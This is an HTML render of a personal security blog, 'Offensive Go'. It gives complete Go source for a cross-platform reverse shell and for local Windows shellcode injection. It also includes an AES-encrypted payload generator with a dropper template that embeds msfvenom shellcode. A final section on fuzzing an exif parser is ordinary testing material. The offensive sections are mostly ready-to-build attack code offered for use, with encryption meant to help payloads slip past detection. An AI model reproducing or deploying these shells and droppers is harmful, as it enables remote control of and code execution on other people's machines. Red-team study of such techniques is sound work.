<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js navy">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Jan0ski's Security Blog</title>
        
        <meta name="robots" content="noindex" />
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="favicon.svg">
        
        
        <link rel="shortcut icon" href="favicon.png">
        
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        
        <link rel="stylesheet" href="css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('navy')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="prefix.html">Index</a></li><li class="chapter-item expanded affix "><li class="part-title">Code</li><li class="chapter-item expanded "><a href="golang/index.html"><strong aria-hidden="true">1.</strong> Offensive Go</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="golang/rev-shell.html"><strong aria-hidden="true">1.1.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="golang/code-injection.html"><strong aria-hidden="true">1.2.</strong> Code Injection</a></li><li class="chapter-item expanded "><a href="golang/encrypted-generator.html"><strong aria-hidden="true">1.3.</strong> Encrypted Paylod Generator</a></li><li class="chapter-item expanded "><a href="golang/exif-fuzz.html"><strong aria-hidden="true">1.4.</strong> Exif Parser Fuzzing</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Cloud Security</li><li class="chapter-item expanded "><a href="k8s/index.html"><strong aria-hidden="true">2.</strong> Containers &amp; Kubernetes</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="k8s/hostpath.html"><strong aria-hidden="true">2.1.</strong> HostPath</a></li><li class="chapter-item expanded "><a href="k8s/kubesec-sdk.html"><strong aria-hidden="true">2.2.</strong> Kube_Security_Lab w/ Client-go</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Challenges</li><li class="chapter-item expanded "><a href="ctf/index.html"><strong aria-hidden="true">3.</strong> CTF Write-ups</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">Jan0ski's Security Blog</h1>

                    <div class="right-buttons">
                        
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                        <a href="https://github.com/jan0ski/jan0ski.github.io" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h2><a class="header" href="#a-page-to-compile-my-journey-through-various-experiments-in-security-research-and-programming" id="a-page-to-compile-my-journey-through-various-experiments-in-security-research-and-programming">A page to compile my journey through various experiments in security research and programming.</a></h2>
<h3><a class="header" href="#i-classfa-fa-twitteria-hrefhttpstwittercomjan0ski_-jan0ski_a--i-classfa-fa-githubia-hrefhttpsgithubcomjan0ski-jan0skia" id="i-classfa-fa-twitteria-hrefhttpstwittercomjan0ski_-jan0ski_a--i-classfa-fa-githubia-hrefhttpsgithubcomjan0ski-jan0skia"><i class="fa fa-twitter"></i><a href="https://twitter.com/jan0ski_"> @jan0ski_</a> | <i class="fa fa-github"></i><a href="https://github.com/jan0ski/"> jan0ski</a></a></h3>
<hr />
<h2><a class="header" href="#-ls-" id="-ls-"><code>$ ls ./</code></a></h2>
<ul>
<li><a href="./golang/rev-shell.html">Offensive Go</a></li>
<li><a href="./k8s/hostpath.html">Containers &amp; Kubernetes</a></li>
<li><a href="">CTF Write-ups</a></li>
</ul>
<h1><a class="header" href="#offensive-go" id="offensive-go">Offensive Go</a></h1>
<h2><a class="header" href="#code" id="code">Code</a></h2>
<ul>
<li><a href="golang/./rev-shell.html">Reverse Shell</a></li>
<li><a href="golang/./code-injection.html">Local Shellcode Injection</a></li>
<li><a href="golang/./encrypted-generator.html">Encrypted Payload Generator</a></li>
</ul>
<h2><a class="header" href="#fuzzing" id="fuzzing">Fuzzing</a></h2>
<ul>
<li><a href="golang/./exif-fuzz.html">Exif Parser Fuzzing</a></li>
</ul>
<h1><a class="header" href="#reverse-shell" id="reverse-shell">Reverse Shell</a></h1>
<blockquote>
<p><i class="fa fa-info-circle fa-lg"></i>
To create a binary for a specific operating system or architecture, set the <code>GOOS</code> and <code>GOARCH</code> environment variables before running the <code>go build</code> command.<br/><br/>
<code>$ GOOS=$target_os GOARCH=$target_arch go build reverse_shell.go</code></p>
</blockquote>
<pre><code class="language-go">package main

import (
	&quot;net&quot;
	&quot;os/exec&quot;
	&quot;runtime&quot;
)

func main() {
	// Establish connection to attacking host
	conn, err := net.Dial(&quot;tcp&quot;, &quot;127.0.0.1:443&quot;)
	if err != nil {
		panic(err)
	}

	// Determine which shell to use
	var shell string
	switch runtime.GOOS {
	case &quot;windows&quot;:
		shell = &quot;cmd.exe&quot;
	case &quot;linux&quot;:
		shell = &quot;/bin/sh&quot;
	case &quot;darwin&quot;:
		shell = &quot;/bin/bash&quot;
	}

	// Run shell command, pointing file descriptors to remote connection
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
</code></pre>
<h1><a class="header" href="#code-injection" id="code-injection">Code Injection</a></h1>
<p>Example of injecting shellcode into a local process.</p>
<hr />
<h2><a class="header" href="#calling-the-windows-api" id="calling-the-windows-api">Calling the Windows API</a></h2>
<p>To call the Windows API in Go, we need to use the <code>syscall</code> library to load <code>kernel32.dll</code> and create references to the functions we need to use. Additionally, we'll create some constants reflecting those that exist in the Windows API.</p>
<p>For shellcode injection, the <code>VirtualAlloc</code> Windows function is used to allocate memory in our process to store the payload.</p>
<pre><code class="language-go">const (
	PROCESS_ALL_ACCESS     = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32         = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
	procVirtualAlloc = kernel32.NewProc(&quot;VirtualAlloc&quot;)
)
</code></pre>
<hr />
<h2><a class="header" href="#allocating-memory-and-calling-virtualalloc" id="allocating-memory-and-calling-virtualalloc">Allocating memory and calling VirtualAlloc</a></h2>
<p>Referencing documentation for the <code>VirtualAlloc</code> function in the C++ Windows API, we set our parameters to the <code>Call</code> function similarly in Go:</p>
<p>C++</p>
<pre><code class="language-c++">LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
</code></pre>
<p>Go</p>
<pre><code class="language-go">	// Allocate memory as PAGE_EXECUTE_READWRITE
	addr, _, err := procVirtualAlloc.Call(
		0,                       // Starting address of region to allocate
		uintptr(len(shellcode)), // Size of region to allocate
		MEM_RESERVE|MEM_COMMIT,  // Memory allocation type
		PAGE_EXECUTE_READWRITE,  // Memory protection permissions
	)
</code></pre>
<p>Next, we write our shellcode into the allocated memory and execute it via a <code>syscall</code> at that memory address.</p>
<p>To copy the shellcode, we create a pointer reference to our allocated memory, <code>addr</code>, and cast it as a pointer to a large byte array.
After the payload is copied in, we can execute it with <code>syscall.Syscall()</code>, passing in our shellcode starting address:</p>
<pre><code class="language-go">	// Write the shellcode into the allocated memory
	buf := (*[890000]byte)(unsafe.Pointer(addr))
	for x, value := range []byte(shellcode) {
		buf[x] = value
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
</code></pre>
<p>Since the msfvenom shellcode is 32-bit, we set the GOARCH environment variable accordingly to compile into a 32-bit executable. If all goes well, building and executing the source should show our shellcode is executed:</p>
<p><img src="golang/../images/reverse_shell.png" alt="Reverse Shell" /></p>
<p align=center>Catching the reverse shell launched via injected shellcode payload.</p>
<hr />
<h2><a class="header" href="#references" id="references">References</a></h2>
<ul>
<li><a href="https://ired.team/offensive-security/code-injection-process-injection/process-injection">CreateRemoteThread Shellcode Injection</a></li>
<li><a href="https://medium.com/jettech/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724">Using Go to Call the Windows API</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN">VirtualAlloc function - Win32 apps</a></li>
</ul>
<h1><a class="header" href="#encrypted-shellcode-injection" id="encrypted-shellcode-injection">Encrypted Shellcode Injection</a></h1>
<p>A tool to generate go source code to compile payloads utilizing encrypted shellcode injection. To be used with a template Go file to execute the encrypted shellcode.</p>
<hr />
<h2><a class="header" href="#encrypted-payload-generator" id="encrypted-payload-generator">Encrypted Payload Generator</a></h2>
<ul>
<li>Generate shellcode with msfvenom or other tools.</li>
<li>Encrypt it using AES-256. </li>
<li>Place the key and the encrypted shellcode into a template Go file. </li>
</ul>
<p>Usage:</br>
<code>$ go run encrypted_payload_creator.go &gt; payload.go</code></p>
<pre><code class="language-go">package main

import (
	&quot;crypto/aes&quot;
	&quot;crypto/cipher&quot;
	&quot;crypto/rand&quot;
	&quot;encoding/base64&quot;
	&quot;io/ioutil&quot;
	&quot;os&quot;
	&quot;text/template&quot;
)

// Struct to hold template arguments
type args struct {
	Key        string
	Ciphertext string
}

// Random bytes for encryption key
func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}

	return b, nil
}

// Returns base64 encoded ciphertext encrypted with random 32-bit key
func encrypt(plaintext []byte) (string, string) {
	key, _ := generateRandomBytes(32)
	block, _ := aes.NewCipher(key)
	ciphertext := make([]byte, len(plaintext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(ciphertext, plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext), base64.StdEncoding.EncodeToString(key)
}

func main() {
	// Read go code template file
	file, err := ioutil.ReadFile(&quot;encrypted_shellcode_template.go&quot;)
	if err != nil {
		panic(err)
	}

	// Parse template
	tmpl, err := template.New(&quot;body&quot;).Parse(string(file))
	if err != nil {
		panic(err)
	}

	// Encrypt payload (notepad.exe)
	data := []byte(&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00&quot;)
	ciphertext, key := encrypt(data)

	// Generate go code for dropper using Ciphertext and Key template variables, print to Stdout
	tmpl.Execute(os.Stdout, args{
		Ciphertext: ciphertext,
		Key:        key,
	})
}
</code></pre>
<h2><a class="header" href="#the-payload-template" id="the-payload-template">The Payload Template</a></h2>
<ul>
<li>Used as a template Go file for the generator to include its encrypted shellcode and key.</li>
<li>Decrypts shellcode with a given key and executes its memory via local code injection.</li>
</ul>
<blockquote>
<p><i class="fa fa-info-circle fa-lg"></i>
Be sure to set GOARCH to 32 or 64-bit depending on your payload when using msfvenom shellcode.</p>
</blockquote>
<pre><code># Linux / Darwin
$ GOOS=windows GOARCH=386 go build encrypted_shellcode.go

# Windows
PS C:\&gt; $Env:GOARCH=386; go build encrypted_shellcode.go
</code></pre>
<p>Encrypted Shellcode Template</p>
<pre><code class="language-go">package main

import (
	&quot;crypto/aes&quot;
	&quot;crypto/cipher&quot;
	&quot;encoding/base64&quot;
	&quot;strings&quot;
	&quot;syscall&quot;
	&quot;unsafe&quot;
)

const (
	PROCESS_ALL_ACCESS     = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32         = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
	procVirtualAlloc = kernel32.NewProc(&quot;VirtualAlloc&quot;)
)

func main() {
	// Decode ciphertext into shellcode
	ciphertext, _ := base64.StdEncoding.DecodeString(&quot;{{.Ciphertext}}&quot;)
	key, _ := base64.StdEncoding.DecodeString(&quot;{{.Key}}&quot;)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	// Allocate memory as PAGE_EXECUTE_READWRITE
	addr, _, err := procVirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil &amp;&amp; !strings.Contains(err.Error(), &quot;operation completed successfully&quot;) {
		panic(err)
	}

	// Write the shellcode into the allocated memory
	buf := (*[890000]byte)(unsafe.Pointer(addr))
	for x, value := range plaintext {
		buf[x] = value
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
</code></pre>
<hr />
<h2><a class="header" href="#references-1" id="references-1">References</a></h2>
<ul>
<li><a href="https://github.com/tomsteele/pen-utils/blob/master/go-encrypt-shellcode-thing/main.go">tomsteele/penutils</a></li>
</ul>
<h1><a class="header" href="#exif-parser-fuzzing" id="exif-parser-fuzzing">Exif Parser Fuzzing</a></h1>
<p>Writing a custom fuzzer for an exif parser using Go.</p>
<hr />
<h2><a class="header" href="#easy-fuzzing-target" id="easy-fuzzing-target">Easy Fuzzing Target</a></h2>
<p>A light google search of common fuzzing targets implemented in memory-unsafe languages such as C leads me to find <a href="https://github.com/mkttanabe/exif/">this</a> repo. It's a great, simple implementation of an exif parser and will work perfectly for our purposes.</p>
<p>To test the output of the tool, compile the binary and run it on a sample jpg containing exif data. A great sample set can be found at https://github.com/ianare/exif-samples.</p>
<pre><code>~/exifFuzz/exif $ make
~/exifFuzz/exif $ ./exif ../exif-samples/Canon_40D.jpg

[Canon_40D.jpg] createIfdTableArray: result=4

{0TH IFD}
 - Make: [Apple]
 - Model: [iPod touch]
 - Orientation: 1
... snip ...
</code></pre>
<h2><a class="header" href="#designing-the-fuzzer" id="designing-the-fuzzer">Designing the Fuzzer</a></h2>
<p>Fuzzing in general is all about rapidly varying the inputs of an application. In this case, all the data we have to manipulate is the contents of our input file. Randomly chaning individual bytes or patterns in the input file is bound to produce some unexpected results. This means our fuzzer will need to perform the following actions:</p>
<ul>
<li>Read in the bytes of a file.</li>
<li>Manipulate the bytes of a file in various ways.</li>
<li>Save the new mutated file.</li>
<li>Run the exif binary on the mutated file.</li>
<li>Detect interesting crashes of the program.</li>
<li>Save the output of these crashes to a file with a meaningful name.</li>
<li>Repeat many many times.</li>
</ul>
<hr />
<h2><a class="header" href="#file-operations" id="file-operations">File Operations</a></h2>
<p>To manipulate the bytes of an input file, we use the <code>ioutil</code> package. We'll create two functions, <code>getBytes</code> and <code>createNew</code> that we will use to read the input file into a slice of bytes and then create a new file after we've mutated them. We can also include a small function, check that we use to check error values.</p>
<p>These helper functions are done simply:</p>
<pre><code class="language-go">// Check and panic on error
func check(e error) {
    if e != nil {
    panic(e)
    }
}

// Retrieve bytes from `filename`
func getBytes(filename string) []byte {
    f, err := ioutil.ReadFile(filename)
    check(err)
    return f
}

// Create new file with `data`
func createNew(data []byte) {
    err := ioutil.WriteFile(&quot;mutated.jpg&quot;, data, 0644)
    check(err)
}
</code></pre>
<h2><a class="header" href="#input-file-mutation" id="input-file-mutation">Input File Mutation</a></h2>
<h3><a class="header" href="#the-bit-flip" id="the-bit-flip">The Bit Flip</a></h3>
<p>An easy way to change input data is a simple bit flip. To implement this, I decided I would randomly select a percentage of the bytes in the file, and of that subset I'd change a byte randomly. This is slightly different than changing a singular bit randomly throughout the file, however I felt it achieved generally the same effect.</p>
<p>To begin we'll need to select bytes at random, keeping track of their indexes in the input byte slice. We subtract 4 bytes off of the the file length to account for the <code>FF D8 FF DB</code> jpg file header.</p>
<pre><code class="language-go">var byteIndexes []int
numBytes := int(float64(len(data)-4) * .01)
for len(byteIndexes) &lt; numBytes {
    // For random ints in range = rand.Intn(Max - Min) + Min
    byteIndexes = append(byteIndexes, rand.Intn((len(data)-4)-4)+4)
}
fmt.Println(&quot;Indexes chosen: &quot;, byteIndexes)
</code></pre>
<p>Knowing these indexes, we'll then loop through the data and change the values of the target bytes, and return the mutated byte slice.</p>
<pre><code class="language-go">// Randomly change the bytes at the location of the chosen indexes
    for _, index := range byteIndexes {
        oldbytes := data[index]
        newbytes := byte(rand.Intn(0xFF))
        data[index] = newbytes
        fmt.Printf(&quot;Changed %x to %x\n&quot;, oldbytes, newbytes)
    }
    return data
</code></pre>
<h3><a class="header" href="#getting-more-sophisticated---magic-numbers" id="getting-more-sophisticated---magic-numbers">Getting More Sophisticated - Magic Numbers</a></h3>
<p>Since I generally don't know what I'm doing, I tend to read many blogs and watch technology streams to discover techniques in areas that I'm unfamiliar with - like Fuzzing! <a href="https://twitter.com/gynvael">Gynvael's YouTube channel</a> has loads of resources on fuzzing and is a great resource for learning more. In his intro to fuzzing stream, he mentions &quot;Magic Numbers&quot; in files that are ripe for manipulation.</p>
<p>The numbers are chosen based on the propensity for errors like integer underflow or overflow to result from changing their values.</p>
<ul>
<li><code>0xFF</code></li>
<li><code>0x7F</code></li>
<li><code>0x00</code></li>
<li><code>0xFFFF</code></li>
<li><code>0x0000</code></li>
<li><code>0xFFFFFFFF</code></li>
<li><code>0x00000000</code></li>
<li><code>0x80000000</code> (Minimum 32-bit integer)</li>
<li><code>0x40000000</code> (1/2 Min 32-bit integer)</li>
<li><code>0x7FFFFFFF</code> (Maximum 32-bit integer)</li>
</ul>
<p>For example, if <code>0x7FFFFFFF</code> is chosen as the value to replace, we'll have to replace the first byte with <code>0x7F</code> and then each subsequent byte with <code>0xFF</code> for a total of 4 bytes in length.</p>
<p>We'll construct a mapping for these values in a slice of int slices, and then pick a set at random to tell us what to change in the input data.</p>
<pre><code class="language-go">// Gynvael's magic numbers https://www.youtube.com/watch?v=BrDujogxYSk&amp;
magicVals := [][]int{
    {1, 255},
    {1, 255},
    {1, 127},
    {1, 0},
    {2, 255},
    {2, 0},
    {4, 255},
    {4, 0},
    {4, 128},
    {4, 64},
    {4, 127},
}

pickedMagic := magicVals[rand.Intn(len(magicVals))]
index := rand.Intn(len(data) - 8)
</code></pre>
<p>We'll then just hard-code our values into a switch statement to change the input data according to the value selected:</p>
<pre><code class="language-go">// Hardcode byte overwrites for tuples beginning with (1, )
    if pickedMagic[0] == 1 {
        switch pickedMagic[1] {
        case 255:
            data[index] = 255
        case 127:
            data[index+1] = 127
        case 0:
            data[index] = 0
        }
        // Hardcode byte overwrites for tuples beginning with (2, )
        } else if pickedMagic[0] == 2 {
            switch pickedMagic[1] {
        case 255:
            data[index] = 255
            data[index+1] = 255
        case 0:
            data[index] = 0
            data[index+1] = 0
        }
        // Hardcode byte overwrites for tuples beginning with (4, )
        } else if pickedMagic[0] == 4 {
            switch pickedMagic[1] {
            case 255:
                data[index] = 255
                data[index+1] = 255
                data[index+2] = 255
                data[index+3] = 255
            case 0:
                data[index] = 0
                data[index+1] = 0
                data[index+2] = 0
                data[index+3] = 0
            case 128:
                data[index] = 128
                data[index+1] = 0
                data[index+2] = 0
                data[index+3] = 0
            case 64:
                data[index] = 64
                data[index+1] = 0
                data[index+2] = 0
                data[index+3] = 0
            case 127:
                data[index] = 127
                data[index+1] = 255
                data[index+2] = 255
                data[index+3] = 255
            }
    }
    return data
}
</code></pre>
<h2><a class="header" href="#randomize-mutations" id="randomize-mutations">Randomize Mutations</a></h2>
<p>To round out our mutation routines, and because our bit flipper isn't entirely obsolete (or at least I like to think it isn't), we can create one last wrapper function for mutating data. This wrapper will randomize our choice of mutator between the <code>mutateMagic</code> and <code>mutateBits</code> techniques.</p>
<pre><code class="language-go">// Select mutator at random to mutate `data`
func mutate(data []byte) []byte {
    mutators := []func([]byte) []byte{mutateBits, mutateMagic}
    return mutators[rand.Intn(len(mutators))](data)
}
</code></pre>
<hr />
<h2><a class="header" href="#writing-the-fuzzing-harness" id="writing-the-fuzzing-harness">Writing the Fuzzing Harness</a></h2>
<p>Now for the real meat of the fuzzer. We need to feed the program our mutated file, and keep track of inputs that cause significant crashes. A significant crash in this case would be writing to memory outside of the range of the program, or a segmentation fault.</p>
<p>To easily capture the error output of a faulting instance of <code>exif</code>, we wrap the command in a <code>bash -c</code> command, and execute it with Go using the <code>os/exec</code> package. We then direct the <code>stderr</code> from the command to our buffer to analyze the output.</p>
<pre><code class="language-go">// Run command, capture output
var output bytes.Buffer
exifCommand := &quot;/bin/bash&quot;
cmd := exec.Command(exifCommand, &quot;-c&quot;, &quot;./exif/bin/exif ./mutated.jpg -verbose&quot;)
cmd.Stderr = &amp;output
err := cmd.Start()
check(err)
</code></pre>
<p>We make sure to include a counter value in our wrapper program so we can determine which run created which error. If we find an iteration has exited in error,  we check our error buffer for evidence of a segfault. When we find a segfault, write the input data as a jpg, labeled with the fuzzing iteration.</p>
<pre><code class="language-go">// Write any crashes to file
if err := cmd.Wait(); err != nil {
    if exitError, ok := err.(*exec.ExitError); ok {
        // Check if error is a segfault
        if strings.Contains(exitError.String(), &quot;segmentation&quot;) {
            // Write falt-causing `data` to jpg file, label with `counter`
            fmt.Printf(&quot;%d - %s\n&quot;, counter, exitError)
            err = ioutil.WriteFile(fmt.Sprintf(&quot;./crashes/crash.%d.jpg&quot;, counter), data, 0644)
            check(err)
        }
    }
}

// Print `counter` as status updates
if counter%100 == 0 {
    fmt.Println(counter)
}
</code></pre>
<h2><a class="header" href="#putting-it-all-together" id="putting-it-all-together">Putting it all Together</a></h2>
<p>Now we're ready to create the main execution flow of our fuzzing routine. Looking back at what we set out to do, we see where each piece fits in:</p>
<ul>
<li>Read in the bytes of a file. ✔ <code>getBytes</code></li>
<li>Manipulate the bytes of a file in various ways. ✔ <code>mutateMagic</code>, <code>mutateBits</code></li>
<li>Save the new mutated file. ✔ <code>mutate</code></li>
<li>Run the exif binary on the mutated file. ✔ <code>exif</code></li>
<li>Detect interesting crashes of the program. ✔ <code>exif</code></li>
<li>Save the output of these crashes to a file with a meaningful name. ✔ <code>exif</code></li>
<li>Repeat many many times.</li>
</ul>
<p>Easy! All we need to do is run this through a loop and make it command-line ready with a <code>main</code> such as:</p>
<pre><code class="language-go">func main() {
    if len(os.Args) &lt; 2 {
        fmt.Println(&quot;Usage: go exifFuzz.go &lt;valid_jpg&gt;&quot;)
        os.Exit(1)
    }

    // Create mutated file
    filename := os.Args[1]
    for counter := 0; counter &lt; 100000; counter++ {
    data := getBytes(filename)
    mutated := mutate(data)
    createNew(mutated)
    exif(counter, mutated)
    }
}
</code></pre>
<p>Running our code gives us updates as it runs, and will start filling the crashes/ directory with jpg data that caused the program to segfault. As it executes iterations of the binary, you'll see it pick up some segfaults.</p>
<pre><code>~/exifFuzz $ go build
~/exifFuzz $ ./exifFuzz exif-samples/jpg/Canon_40D.jpg
0
19 - signal: segmentation fault
65 - signal: segmentation fault
66 - signal: segmentation fault
... snip ...
</code></pre>
<p>Once our fuzzer is done, we can confirm the accuracy of our crash data by trying one out ourselves:</p>
<pre><code>~/exifFuzz $ ./exif/bin/exif crashes/crash.2436.jpg
Segmentation fault
</code></pre>
<h2><a class="header" href="#conclusion" id="conclusion">Conclusion</a></h2>
<p>My experience with Go is that it is an extremely versatile and easy to learn language, with powerful low-level capabilities. Finding tools and solutions in one language and implementing them in Go is rather straightforward, and a great way to learn more, no what matter the source language is. This is a great example of a highly-documented use case that is a great exercise for learning a new language. This fuzzer can definitely be improved upon with <a href="https://tour.golang.org/concurrency/1">goroutines</a> for concurrency among many other optimizations for performance. We'll see what we can do in the future to implement concurrency into our fuzzer, or possibly implement it again in a more performant type-safe language such as Rust. Additionally, we could go down the route of exploitation, and explore ways of identifying vulnerabilities brought to light by our fuzzer.</p>
<p>The full source of this lab can be found on my <a href="https://github.com/jan0ski/exifFuzz">Github</a>. It includes everything needed for the steps covered here (including a version for the win32 binary!).</p>
<hr />
<h2><a class="header" href="#references-2" id="references-2">References</a></h2>
<ul>
<li><a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman/#">h0mbre - Fuzzing Like A Caveman</a></li>
<li><a href="https://github.com/jaybosamiya/security-notes#basics-of-fuzzing">jaybosamiya - Security Notes</a></li>
